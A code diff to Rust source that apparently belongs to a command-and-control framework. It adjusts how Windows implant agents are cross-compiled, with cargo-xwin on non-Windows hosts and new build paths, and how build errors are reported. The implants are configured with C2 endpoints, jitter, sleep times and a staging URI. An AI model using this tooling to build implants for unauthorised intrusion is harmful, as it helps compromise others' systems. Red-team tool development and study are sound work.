@@ -1,4 +1,5 @@
 use std::{
+    env::current_dir,
     fs::create_dir_all,
     io,
     path::{Path, PathBuf},
@@ -251,9 +252,11 @@ pub async fn build_all_bins(
         };
 
         let src_dir = if cfg!(windows) {
-            PathBuf::from(format!("../target/{dir_name}"))
+            PathBuf::from(format!("./implant/target/{dir_name}"))
         } else {
-            PathBuf::from(format!("../target/x86_64-pc-windows-msvc/{dir_name}"))
+            PathBuf::from(format!(
+                "./implant/target/x86_64-pc-windows-msvc/{dir_name}"
+            ))
         };
 
         let out_dir = Path::new(&save_path);
@@ -279,19 +282,16 @@ pub async fn build_all_bins(
 
         // Error check..
         if let Err(e) = tokio::fs::rename(&src, &dest).await {
-            let _ = stage_new_agent_error_printer(
-                &format!(
-                    "Failed to rename built agent, looking for: {}, to rename to: {}. {e}",
-                    src.display(),
-                    dest.display()
-                ),
-                &data.staging_endpoint,
-                state,
-            )
-            .await;
+            let cwd = current_dir().expect("could not get cwd");
+            let msg = format!(
+                "Failed to rename built agent, looking for: {}, to rename to: {}. Cwd: {cwd:?} {e}",
+                src.display(),
+                dest.display()
+            );
+            let _ = stage_new_agent_error_printer(&msg, &data.staging_endpoint, state).await;
             let _ = remove_dir(&save_path).await?;
 
-            return Err(format!("Failed to rename agent. {e}"));
+            return Err(msg);
         };
 
         //
@@ -692,7 +692,11 @@ async fn build_agent(
         Some("x86_64-pc-windows-msvc")
     };
 
-    let mut cmd = tokio::process::Command::new("cargo");
+    let mut cmd = if !cfg!(windows) {
+        tokio::process::Command::new("cargo-xwin")
+    } else {
+        tokio::process::Command::new("cargo")
+    };
 
     let c2_endpoints = data
         .c2_endpoints
@@ -703,7 +707,7 @@ async fn build_agent(
     let jitter = data.jitter.unwrap_or_default();
 
     cmd.env("RUSTUP_TOOLCHAIN", toolchain)
-        .current_dir("../implant")
+        .current_dir("./implant")
         .env("AGENT_NAME", &data.implant_name)
         .env("PE_NAME", pe_name)
         .env("DEF_SLEEP_TIME", data.default_sleep_time.to_string())
@@ -714,10 +718,6 @@ async fn build_agent(
         .env("USERAGENT", &data.useragent)
         .env("STAGING_URI", &data.staging_endpoint)
         .env("SECURITY_TOKEN", &data.agent_security_token);
-
-    if !cfg!(windows) {
-        cmd.arg("xwin");
-    }
 
     cmd.arg("build");
 
